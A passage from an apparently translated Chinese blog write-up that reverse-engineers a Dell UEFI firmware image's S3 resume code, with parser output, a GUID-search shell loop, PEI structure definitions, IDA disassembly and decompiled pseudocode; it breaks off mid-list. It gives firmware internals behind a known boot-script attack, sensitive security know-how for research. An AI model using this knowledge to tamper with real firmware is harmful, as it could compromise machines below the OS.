image section)</span><br><span class="line">      File 2: 7fd38521-7798-41e5-5e81-12e01fe23c11 type 0x06, attr 0x40, state 0x07, size 0x3cf9 (15609 bytes), (pei module)</span><br><span class="line">        Section 0: type 0x1b, size 0x3a (58 bytes) (PEI dependency expression section)</span><br><span class="line">        Section 1: type 0x01, size 0x3ca5 (15525 bytes) (Compression section)</span><br><span class="line">          Section 0: type 0x10, size 0x8924 (35108 bytes) (PE32 image section)</span><br><span class="line">      File 3: 70c2051d-5956-4466-39b1-9e1346f9de0c type 0x06, attr 0x40, state 0x07, size 0x3790 (14224 bytes), (pei module)</span><br><span class="line">        Section 0: type 0x1b, size 0x3a (58 bytes) (PEI dependency expression section)</span><br><span class="line">        Section 1: type 0x01, size 0x373c (14140 bytes) (Compression section)</span><br><span class="line">          Section 0: type 0x10, size 0x5964 (22884 bytes) (PE32 image section)</span><br><span class="line">      File 4: dc292e2e-d532-4eb7-2f83-3068d7f5951e type 0x06, attr 0x40, state 0x07, size 0x7dc (2012 bytes), (pei module)</span><br><span class="line">        Section 0: type 0x1b, size 0x5e (94 bytes) (PEI dependency expression section)</span><br><span class="line">        Section 1: type 0x10, size 0x764 (1892 bytes) (PE32 image section)</span><br><span class="line">      File 5: 078f54d4-cc22-4048-949e-879c214d562f type 0xf0, attr 0x00, state 0x07, size 0x47010 (290832 bytes), (ffs padding)</span><br><span class="line">      File 6: 1ba0062e-c779-4582-6685-336ae8f78f09 (EFI_FFS_VOLUME_TOP_FILE_GUID) type 0x02, attr 0x40, state 0x07, size 0x20 (32 bytes), (freeform)</span><br><span class="line">        Section 0: type 0x19, size 0x8 (8 bytes) (Raw section)</span><br><span class="line">    Firmware Volume: 8c8ce578-8a3d-4f1c-3599-896185c32dd3 attr 0x0003feff, rev 2, cksum 0xe1c4, size 0x4c0000 (4980736 bytes)</span><br><span class="line">      Firmware Volume Blocks:  (1216, 0x1000)</span><br><span class="line">      File 0: 5c266089-e103-4d43-b59a-12d7095be2af type 0x07, attr 0x40, state 0x07, size 0xa2a (2602 bytes), (driver)</span><br><span class="line">        Section 0: type 0x13, size 0x28 (40 bytes) (DXE dependency expression section)</span><br><span class="line">        Section 1: type 0x01, size 0x9ea (2538 bytes) (Compression section)</span><br><span class="line">          Section 0: type 0x10, size 0x12c4 (4804 bytes) (PE32 image section)</span><br><span class="line">      File 1: 5bba83e6-f027-4ca7-d0bf-16358cc9e123 type 0x07, attr 0x40, state 0x07, size 0xac3c (44092 bytes), (driver)</span><br><span class="line">        Section 0: type 0x10, size 0xac24 (44068 bytes) (PE32 image section)</span><br><span class="line">      File 2: 8d59ebc8-b85e-400e-0a97-1f995d1db91e type 0x07, attr 0x40, state 0x07, size 0xa9dc (43484 bytes), (driver)</span><br><span class="line">        Section 0: type 0x10, size 0xa9c4 (43460 bytes) (PE32 image section)</span><br><span class="line">      File 3: eb969dee-3ca7-482e-7589-ef8d9f160dd1 type 0x07, attr 0x40, state 0x07, size 0x8ba (2234 bytes), (driver)</span><br><span class="line">        Section 0: type 0x13, size 0x16 (22 bytes) (DXE dependency expression section)</span><br><span class="line">        Section 1: type 0x01, size 0x88a (2186 bytes) (Compression section)</span><br><span class="line">          Section 0: type 0x10, size 0x10c4 (4292 bytes) (PE32 image section)</span><br><span class="line">      File 4: f918e883-7c0f-444c-0ba7-a73350112689 type 0x07, attr 0x40, state 0x07, size 0xbdb (3035 bytes), (driver)</span><br><span class="line">        Section 0: type 0x13, size 0x16 (22 bytes) (DXE dependency expression section)</span><br><span class="line">        Section 1: type 0x01, size 0xbab (2987 bytes) (Compression section)</span><br><span class="line">          Section 0: type 0x10, size 0x1704 (5892 bytes) (PE32 image section)</span><br><span class="line">      File 5: e03abadf-e536-4e88-a0b3-b77f78eb34fe (DELL_CPU_DXE_GUID) type 0x07, attr 0x40, state 0x07, size 0x1883 (6275 bytes), (driver)</span><br><span class="line">        Section 0: type 0x13, size 0x6 (6 bytes) (DXE dependency expression section)</span><br><span class="line">        Section 1: type 0x01, size 0x1863 (6243 bytes) (Compression section)</span><br><span class="line">          Section 0: type 0x10, size 0x2d24 (11556 bytes) (PE32 image section)</span><br><span class="line">      File 6: 93022f8c-1f09-47ef-b2bb-5814ff609df5 (DELL_FILE_SYSTEM_GUID) type 0x07, attr 0x40, state 0x07, size 0x46c1 (18113 bytes), (driver)</span><br><span class="line">        Section 0: type 0x01, size 0x46a9 (18089 bytes) (Compression section)</span><br><span class="line">          Section 0: type 0x10, size 0x7e04 (32260 bytes) (PE32 image section)</span><br><span class="line">      File 7: dac2b117-b5fb-4964-12a3-0dcc77061b9b (FONT_FFS_FILE_GUID) type 0x02, attr 0x40, state 0x07, size 0x5a5 (1445 bytes), (freeform)</span><br><span class="line">        Section 0: type 0x01, size 0x58d (1421 bytes) (Compression section)</span><br><span class="line">          Section 0: type 0x18, size 0xfc4 (4036 bytes) (Free-form GUID section)</span><br><span class="line">      File 8: 9221315b-30bb-46b5-3e81-1b1bf4712bd3 (SETUP_DEFAULTS_FFS_GUID) type 0x02, attr 0x40, state 0x07, size 0x178 (376 bytes), (freeform)</span><br><span class="line">        Section 0: type 0x01, size 0x160 (352 bytes) (Compression section)</span><br><span class="line">          Section 0: type 0x19, size 0x2c4 (708 bytes) (Raw section)</span><br><span class="line">      File 9: 5ae3f37e-4eae-41ae-4082-35465b5e81eb (DELL_CORE_DXE_GUID) type 0x05, attr 0x40, state 0x07, size 0x27b15 (162581 bytes), (dxe core)</span><br><span class="line">        Section 0: type 0x01, size 0x27afd (162557 bytes) (Compression section)</span><br><span class="line">          Section 0: type 0x10, size 0x152a44 (1387076 bytes) (PE32 image section)</span><br><span class="line">          Section 1: type 0x18, size 0xc53 (3155 bytes) (Free-form GUID section)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">... around 300 of other FFS files that was skipped</span><br></pre></td></tr></table></figure>


<p>作为uefi-firmware-parser的替代，你可以看看<a target="_blank" rel="noopener" href="https://github.com/LongSoft/UEFITool">UEFITool</a>，这是个基于Qt的工具，可以在Windows，OS X和Linux上运行。<br>攻击的原始描述提到了<code>EFI_PEI_S3_RESUME_PPI</code>，这是实现ACPI boot script处理的EFI接口。这个接口的GUID值是<code>4426CCB2-E684-4a8a-ae40-20d4b025b710</code>，让我们在UEFI模块中搜索从固件中提取的原始二进制数据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ for s in `find ./fw_extracted -type d`; \</span><br><span class="line">do grep -obUaP &#x27;\xb2\xcc\x26\x44\x84\xe6\x8a\x4a&#x27; $s/*; \</span><br><span class="line">done | grep &#x27;\.pe&#x27; | awk -F: &#x27;&#123;print $1, $2&#125;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">./fw_extracted/regions/region-bios/volume-volume/file-92685943-d810-47ff-12a1-cc8490776a1f/section0.pe 49160</span><br><span class="line">./fw_extracted/regions/region-bios/volume-volume/file-efd652cc-0e99-40f0-c096-e08c089070fc/section1.pe 5408</span><br></pre></td></tr></table></figure>


<p>这个GUID只存在于两个文件中：<code>file-efd652cc-0e99-40f0-c096-e08c089070fc/section1.pe</code>和<code>file-92685943-d810-47ff-12a1-cc8490776a1f/section0.pe</code>。根据UEFI -firmware-parser的输出，它们都是UEFI PEI (EFI前期初始化)的可执行文件，所以，让我们用IDA来看看。</p>
<h2 id="PEI介绍"><a href="#PEI介绍" class="headerlink" title="PEI介绍"></a>PEI介绍</h2><p>在我们开始之前，让我们学习几个关键概念，这些概念是反汇编并理解UEFI PEI阶段代码所需的。<br>PEI 基础API由EFI_PEI_SERVICES结构体来描述，runtime通常将这个结构体的地址传递给从FFS加载的每个PEI模块(PEIM)的入口点函数。下面是这个结构体的定义和函数描述:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _EFI_PEI_SERVICES </span><br><span class="line">&#123;</span><br><span class="line">  EFI_TABLE_HEADER               Hdr;                // Table header.</span><br><span class="line">  EFI_PEI_INSTALL_PPI            InstallPpi;         // Installs an interface.</span><br><span class="line">  EFI_PEI_REINSTALL_PPI          ReInstallPpi;       // Reinstalls an interface.</span><br><span class="line">  EFI_PEI_LOCATE_PPI             LocatePpi;          // Locates installed interface by GUID.</span><br><span class="line">  EFI_PEI_NOTIFY_PPI             NotifyPpi;          // Installs notification service for interface</span><br><span class="line">                                                     // installation and reinstallation.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  EFI_PEI_GET_BOOT_MODE          GetBootMode;        // Returns the present value of the boot mode.</span><br><span class="line">  EFI_PEI_SET_BOOT_MODE          SetBootMode;        // Sets the value of the boot mode.</span><br><span class="line">  EFI_PEI_GET_HOB_LIST           GetHobList;         // Get Hand-Off Blocks (HOBs) list pointer.</span><br><span class="line">  EFI_PEI_CREATE_HOB             CreateHob;          // Abstracts the creation of HOB headers.</span><br><span class="line">  EFI_PEI_FFS_FIND_NEXT_VOLUME   FfsFindNextVolume;  // Discovers instances of firmware volumes.</span><br><span class="line">  EFI_PEI_FFS_FIND_NEXT_FILE     FfsFindNextFile;    // Discovers instances of firmware files.</span><br><span class="line">  EFI_PEI_FFS_FIND_SECTION_DATA  FfsFindSectionData; // Discovers files of the firmware File System</span><br><span class="line">                                                     // (FFS) volume.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  EFI_PEI_INSTALL_PEI_MEMORY     InstallPeiMemory;   // Registers the found memory configuration.</span><br><span class="line">  EFI_PEI_ALLOCATE_PAGES         AllocatePages;      // Allocates memory ranges.</span><br><span class="line">  EFI_PEI_ALLOCATE_POOL          AllocatePool;       // Allocates memory from the HOB heap.</span><br><span class="line">  EFI_PEI_COPY_MEM               CopyMem;            // Copies the contents of one buffer to another.</span><br><span class="line">  EFI_PEI_SET_MEM                SetMem;             // Fills a buffer with a specified value.</span><br><span class="line">  EFI_PEI_REPORT_STATUS_CODE     ReportStatusCode;   // Provides an interface that a PEIM can call</span><br><span class="line">                                                     // to report a status code.</span><br><span class="line">                                                    </span><br><span class="line">  EFI_PEI_RESET_SYSTEM           ResetSystem;        // Resets the entire platform.</span><br><span class="line">  EFI_PEI_CPU_IO_PPI             CpuIo;              // Provides an interface for I/O transactions.</span><br><span class="line">  EFI_PEI_PCI_CFG_PPI            PciCfg;             // Provides an interface for PCI configuration</span><br><span class="line">                                                     // transactions.</span><br><span class="line">&#125; EFI_PEI_SERVICES;</span><br></pre></td></tr></table></figure>


<p>PEIMs可以使用<code>InstallPpi()</code>函数通过GUID安装PEI PEIM-to-PRIM 接口（PPI）的数据库：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">typedef EFI_PEI_PPI_DESCRIPTOR </span><br><span class="line">&#123;</span><br><span class="line">  UINTN    Flags; // Interface flags.</span><br><span class="line">  EFI_GUID *Guid; // Interface GUID.</span><br><span class="line">  VOID     *Ppi;  // Pointer to the interface-specific structure.</span><br><span class="line"> </span><br><span class="line">&#125; EFI_PEI_PPI_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">typedef</span><br><span class="line">EFI_STATUS</span><br><span class="line">(EFIAPI * EFI_PEI_INSTALL_PPI)(</span><br><span class="line">  IN struct _EFI_PEI_SERVICES **PeiServices,</span><br><span class="line">  IN EFI_PEI_PPI_DESCRIPTOR   *PpiList // List of the interfaces to install.</span><br><span class="line">);</span><br></pre></td></tr></table></figure>


<p>PEIMs也可以使用<code>LocatePpi()</code>函数通过它的GUID查找现有的接口(可以由相同的PEIM或其他的PEIM实现)：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef</span><br><span class="line">EFI_STATUS</span><br><span class="line">(EFIAPI * EFI_PEI_LOCATE_PPI)(</span><br><span class="line">  IN     struct _EFI_PEI_SERVICES **PeiServices,</span><br><span class="line">  IN     EFI_GUID                 *Guid,</span><br><span class="line">  IN     UINTN                    Instance,</span><br><span class="line">  IN OUT EFI_PEI_PPI_DESCRIPTOR   **PpiDescriptor,</span><br><span class="line">  IN OUT VOID                     **Ppi</span><br><span class="line">);</span><br></pre></td></tr></table></figure>


<h2 id="逆向分析S3恢复代码"><a href="#逆向分析S3恢复代码" class="headerlink" title="逆向分析S3恢复代码"></a>逆向分析S3恢复代码</h2><p>让我们在IDA中加载<code>file-efd652cc-0e99-40f0-c096-e08c089070fc/section1.pe</code>文件，并检查模块入口点周围的一些代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">.text:FFBB54EE                 public EntryPoint</span><br><span class="line">.text:FFBB54EE EntryPoint      proc near</span><br><span class="line">.text:FFBB54EE</span><br><span class="line">.text:FFBB54EE arg_0           = dword ptr  4</span><br><span class="line">.text:FFBB54EE arg_4           = dword ptr  8</span><br><span class="line">.text:FFBB54EE</span><br><span class="line">.text:FFBB54EE                 push    esi</span><br><span class="line">.text:FFBB54EF                 mov     esi, [esp+4+arg_4]</span><br><span class="line">.text:FFBB54F3                 push    esi</span><br><span class="line">.text:FFBB54F4                 push    [esp+8+arg_0]</span><br><span class="line">.text:FFBB54F8                 call    sub_FFBB5D9C</span><br><span class="line">.text:FFBB54FD                 mov     eax, [esi]</span><br><span class="line">.text:FFBB54FF                 push    offset unk_FFBB64C8</span><br><span class="line">.text:FFBB5504                 push    esi</span><br><span class="line">.text:FFBB5505                 call    dword ptr [eax+18h]</span><br><span class="line">.text:FFBB5508                 add     esp, 10h</span><br><span class="line">.text:FFBB550B                 pop     esi</span><br><span class="line">.text:FFBB550C                 retn</span><br><span class="line">.text:FFBB550C EntryPoint      endp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:FFBB5D9C sub_FFBB5D9C    proc near</span><br><span class="line">.text:FFBB5D9C</span><br><span class="line">.text:FFBB5D9C arg_4           = dword ptr  8</span><br><span class="line">.text:FFBB5D9C</span><br><span class="line">.text:FFBB5D9C                 mov     eax, [esp+arg_4]</span><br><span class="line">.text:FFBB5DA0                 mov     ecx, [eax]</span><br><span class="line">.text:FFBB5DA2                 push    offset unk_FFBB6558</span><br><span class="line">.text:FFBB5DA7                 push    eax</span><br><span class="line">.text:FFBB5DA8                 call    dword ptr [ecx+18h]</span><br><span class="line">.text:FFBB5DAB                 pop     ecx</span><br><span class="line">.text:FFBB5DAC                 pop     ecx</span><br><span class="line">.text:FFBB5DAD                 retn</span><br><span class="line">.text:FFBB5DAD sub_FFBB5D9C    endp</span><br></pre></td></tr></table></figure>


<p>对UEFI二进制文件的逆向分析，并没有太多有用的工具或IDA脚本，一个应该提到的项目：<a target="_blank" rel="noopener" href="https://github.com/snare/ida-efiutils">EFI scripts for IDA Pro</a>，by <a target="_blank" rel="noopener" href="https://twitter.com/snare">@snare</a>。不幸的是，<code>rename_tables()</code>和<code>rename_structs()</code>函数(实际上是最需要的函数)不适用于PEI模块，因为针对IDA Pro的EFI脚本是为DXE阶段设计的。你可以尝试通过向<a target="_blank" rel="noopener" href="https://github.com/snare/ida-efiutils/blob/master/efiutils.py">efiutils.py</a>中添加对<code>EFI_PEI_SERVICES</code>表的正确处理来实现PEI支持。尽管如此，GUIDs查找和重命名特性适用于所有类型的二进制文件，你还可以将UEFI数据结构定义作为<a target="_blank" rel="noopener" href="https://github.com/snare/ida-efiutils/blob/master/behemoth.h">单个文件</a>获取，以便于将其加载到IDA中。<br>在手动修改类型信息和重命名guid之后，模块入口点的汇编代码看起来非常友好:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">.text:FFBB54EE ; EFI_STATUS __stdcall EntryPoint(PVOID FileHandle, EFI_PEI_SERVICES **ppPeiServices)</span><br><span class="line">.text:FFBB54EE                 public EntryPoint</span><br><span class="line">.text:FFBB54EE EntryPoint      proc near</span><br><span class="line">.text:FFBB54EE</span><br><span class="line">.text:FFBB54EE FileHandle      = dword ptr  4</span><br><span class="line">.text:FFBB54EE ppPeiServices   = dword ptr  8</span><br><span class="line">.text:FFBB54EE</span><br><span class="line">.text:FFBB54EE                 push    esi</span><br><span class="line">.text:FFBB54EF                 mov     esi, [esp+4+ppPeiServices]</span><br><span class="line">.text:FFBB54F3                 push    esi</span><br><span class="line">.text:FFBB54F4                 push    [esp+8+FileHandle]</span><br><span class="line">.text:FFBB54F8                 call    RegisterBootScriptExecuter</span><br><span class="line">.text:FFBB54FD                 mov     eax, [esi]</span><br><span class="line">.text:FFBB54FF                 push    offset gEfiPeiS3ResumePpiDescriptor ; EFI_PEI_PPI_DESCRIPTOR *</span><br><span class="line">.text:FFBB5504                 push    esi ; PEFI_PEI_SERVICES *</span><br><span class="line">.text:FFBB5505                 call    [eax+EFI_PEI_SERVICES.InstallPpi]</span><br><span class="line">.text:FFBB5508                 add     esp, 10h</span><br><span class="line">.text:FFBB550B                 pop     esi</span><br><span class="line">.text:FFBB550C                 retn</span><br><span class="line">.text:FFBB550C EntryPoint      endp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:FFBB5D9C ; EFI_STATUS __cdecl RegisterBootScriptExecuter(PVOID FileHandle, EFI_PEI_SERVICES **ppPeiServices)</span><br><span class="line">.text:FFBB5D9C RegisterBootScriptExecuter proc near</span><br><span class="line">.text:FFBB5D9C</span><br><span class="line">.text:FFBB5D9C ppPeiServices   = dword ptr  8</span><br><span class="line">.text:FFBB5D9C</span><br><span class="line">.text:FFBB5D9C                 mov     eax, [esp+ppPeiServices]</span><br><span class="line">.text:FFBB5DA0                 mov     ecx, [eax]</span><br><span class="line">.text:FFBB5DA2                 push    offset gEfiPeiBootScriptExecuterPpiDescriptor ; EFI_PEI_PPI_DESCRIPTOR *</span><br><span class="line">.text:FFBB5DA7                 push    eax ; PEFI_PEI_SERVICES *</span><br><span class="line">.text:FFBB5DA8                 call    [ecx+EFI_PEI_SERVICES.InstallPpi]</span><br><span class="line">.text:FFBB5DAB                 pop     ecx</span><br><span class="line">.text:FFBB5DAC                 pop     ecx</span><br><span class="line">.text:FFBB5DAD                 retn</span><br><span class="line">.text:FFBB5DAD RegisterBootScriptExecuter endp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.data:FFBB645C gEfiPeiS3ResumePpiGuid dd 4426CCB2h     ; Data1</span><br><span class="line">.data:FFBB645C                 dw 0E684h               ; Data2</span><br><span class="line">.data:FFBB645C                 dw 4A8Ah                ; Data3</span><br><span class="line">.data:FFBB645C                 db 0AEh, 40h, 20h, 0D4h, 0B0h, 25h, 0B7h, 10h; Data4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.data:FFBB64A8 gEfiPeiS3ResumePpi EFI_PEI_S3_RESUME_PPI &lt;0FFBB51BCh&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.data:FFBB64C8 gEfiPeiS3ResumePpiDescriptor EFI_PEI_PPI_DESCRIPTOR &lt;80000010h, \</span><br><span class="line">.data:FFBB64C8                                         offset gEfiPeiS3ResumePpiGuid, \</span><br><span class="line">.data:FFBB64C8                                         offset gEfiPeiS3ResumePpi&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.data:FFBB6524 gEfiPeiBootScriptExecuterPpiGuid dd 0ABD42895h    ; Data1</span><br><span class="line">.data:FFBB6524                 dw 78CFh                          ; Data2</span><br><span class="line">.data:FFBB6524                 dw 4872h                          ; Data3</span><br><span class="line">.data:FFBB6514                 db 9Dh, 0FCh, 6Ch, 0BFh, 5Eh, 0E2h, 2Ch, 2Eh; Data4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.data:FFBB6554 gEfiPeiBootScriptExecuterPpi EFI_PEI_BOOT_SCRIPT_EXECUTER_PPI &lt;0FFBB5608h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.data:FFBB6558 gEfiPeiBootScriptExecuterPpiDescriptor EFI_PEI_PPI_DESCRIPTOR &lt;80000010h, \</span><br><span class="line">.data:FFBB6558                                         offset gEfiPeiBootScriptExecuterPpiGuid, \</span><br><span class="line">.data:FFBB6558                                         offset gEfiPeiBootScriptExecuterPpi&gt;</span><br></pre></td></tr></table></figure>


<p>以及这些函数的类c伪代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">EFI_STATUS __stdcall EntryPoint(PVOID FileHandle, EFI_PEI_SERVICES **ppPeiServices)</span><br><span class="line">&#123;</span><br><span class="line">  RegisterBootScriptExecuter(FileHandle, ppPeiServices);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // install S3 resume PPI</span><br><span class="line">  return (*ppPeiServices)-&gt;InstallPpi(ppPeiServices, &amp;gEfiPeiS3ResumePpiDescriptor);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EFI_STATUS __cdecl RegisterBootScriptExecuter(PVOID FileHandle, EFI_PEI_SERVICES **ppPeiServices)</span><br><span class="line">&#123;</span><br><span class="line">  // install boot script executer PPI</span><br><span class="line">  return (*ppPeiServices)-&gt;InstallPpi(ppPeiServices, &amp;gEfiPeiBootScriptExecuterPpiDescriptor);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>很明显，加载这个模块后注册了两个接口(关于它们的更多细节在specs中提供):</p>
<ul>
<li><code>EFI_PEI_S3_RESUME_PPI </code> —— 完成固件S3恢复引导路径和传输控制到操作系统的PPI。</li>
<li><code>EFI_PEI_BOOT_SCRIPT_EXECUTER_PPI</code> —— 生成解析并执行框架引导脚本表函数的PPI。</li>
</ul>
<p>第二个模块也很容易理解，<code>file-92685943-d810-47ff-12a1-cc8490776a1f/section0.pe</code>(根据其GUID，这实际上是PEI的核心模块)的<code>sub_FFFCA505</code>函数引用了<code>EFI_PEI_S3_RESUME2_PPI_GUID</code>。此过程调用<code>EFI_PEI_S3_RESUME2_PPI.S3RestoreConfig2()</code>（如果可用）或<code>EFI_PEI_S3_RESUME_PPI.S3RestoreConfig()</code>。在我的测试系统上似乎只使用了<code>EFI_PEI_S3_RESUME_PPI</code>接口。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">EFI_STATUS __cdecl <span class="title function_">sub_FFFCA505</span><span class="params">(EFI_PEI_SERVICES **ppPeiServices)</span></span><br><span class="line">&#123;</span><br><span class="line">  EFI_STATUS Result;</span><br><span class="line">  EFI_STATUS Status;</span><br><span class="line">  EFI_PEI_S3_RESUME2_PPI *pS3Resume2;</span><br><span class="line">  EFI_PEI_S3_RESUME_PPI *pS3Resume;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// try to locate S3Resume2 PPI first</span></span><br><span class="line">  <span class="keyword">if</span> ((*ppPeiServices)-&gt;LocatePpi(</span><br><span class="line">    ppPeiServices, &amp;gEfiPeiS3Resume2PpiGuid, <span class="number">0</span>, &amp;ppPeiServices, &amp;pS3Resume2) &amp; <span class="number">0x80000000</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// try to use S3Resume PPI if fails</span></span><br><span class="line">    Status = (*ppPeiServices)-&gt;LocatePpi(</span><br><span class="line">      ppPeiServices_, &amp;gEfiPeiS3ResumePpiGuid, <span class="number">0</span>, &amp;ppPeiServices, &amp;pS3Resume</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (Status &amp; <span class="number">0x80000000</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      (*ppPeiServices)-&gt;ReportStatusCode(ppPeiServices, <span class="number">0x80000002</span>u, <span class="number">0x3038005</span>u, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// unable to locate required PPI</span></span><br><span class="line">      Result = Status;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// restore platform state</span></span><br><span class="line">      Result = pS3Resume-&gt;S3RestoreConfig(ppPeiServices);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// restore platform state</span></span><br><span class="line">    Result = pS3Resume2-&gt;S3RestoreConfig2(pS3Resume2);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> Result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>现在回过来看第一个PEI模块。Intel S3恢复引导路径规范对必须通过实现<code>EFI_PEI_S3_RESUME_PPI.S3RestoreConfig()</code>来完成的操作进行了描述：</p>
<blockquote>
<p> 该函数将平台恢复到预先存储在EFI_ACPI_S3_RESUME_SCRIPT_TABLE中的预引导配置，并将控制权转移到OS唤醒向量。调用后，该函数负责在跳转到OS唤醒向量之前定位以下信息:</p>
</blockquote>
<ul>
<li>ACPI table</li>
<li>S3 resume 引导脚本表</li>
